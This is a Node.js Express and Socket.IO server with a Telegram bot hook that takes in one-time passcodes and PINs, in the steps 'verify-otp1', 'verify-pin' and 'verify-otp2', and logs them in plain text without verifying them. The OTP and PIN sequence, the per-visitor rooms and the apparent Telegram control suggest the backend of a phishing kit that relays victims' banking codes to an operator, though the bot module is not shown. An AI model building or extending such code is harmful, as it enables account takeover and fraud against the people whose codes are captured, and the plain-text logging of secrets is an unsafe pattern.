const express = require('express');
const http = require('http');
const path = require('path');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);

// Configure Socket.IO with polling fallback
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    transports: ['polling']
});

// JSON and body parser middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files from the public folder
app.use(express.static(path.join(__dirname, 'public')));

// Root route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Global active rooms configuration
global.activeRooms = global.activeRooms || {};

const botToken = process.env.TELEGRAM_BOT_TOKEN;
// Resolve Vercel system-defined environment variables safely
const vercelUrl = process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : '';

// Import and cleanly bind the Telegram Bot Manager safely
let bot = null;
try {
    const initializeBot = require('./bot_manager');
    bot = initializeBot(botToken, io, vercelUrl);
} catch (error) {
    console.error("[Startup Error] Failed to initialize Telegram Bot:", error);
}

// Bot webhook update endpoint
app.post('/api/bot-webhook', (req, res) => {
    try {
        if (bot && typeof bot.processUpdate === 'function') {
            bot.processUpdate(req.body);
        }
        res.status(200).json({ status: 'ok' });
    } catch (err) {
        console.error("[Webhook Error] Error processing update:", err);
        res.status(500).json({ error: err.message });
    }
});

// Socket.IO real-time pipelines
io.on('connection', (socket) => {
    socket.on('join-room', (appId) => {
        if (!appId) return;
        socket.join(appId);
        
        if (!global.activeRooms[appId]) {
            global.activeRooms[appId] = { socketId: socket.id, status: 'pending' };
        } else {
            global.activeRooms[appId].socketId = socket.id;
        }
        socket.emit('room-joined-success', { appId, status: global.activeRooms[appId].status });
    });

    socket.on('request-otp1', (data) => {
        const { appId } = data;
        if (global.activeRooms[appId]) {
            global.activeRooms[appId].status = 'otp1_requested';
        }
        socket.emit('otp1-requested-success');
    });

    socket.on('verify-otp1', (data) => {
        const { appId, code } = data;
        console.log(`[Event] Verify OTP1 for ${appId}: ${code}`);
    });

    socket.on('verify-pin', (data) => {
        const { appId, pin } = data;
        console.log(`[Event] Verify PIN for ${appId}: ${pin}`);
    });

    socket.on('verify-otp2', (data) => {
        const { appId, code } = data;
        console.log(`[Event] Verify OTP2 for ${appId}: ${code}`);
    });
});

// Export the server for Vercel's engine
module.exports = server;
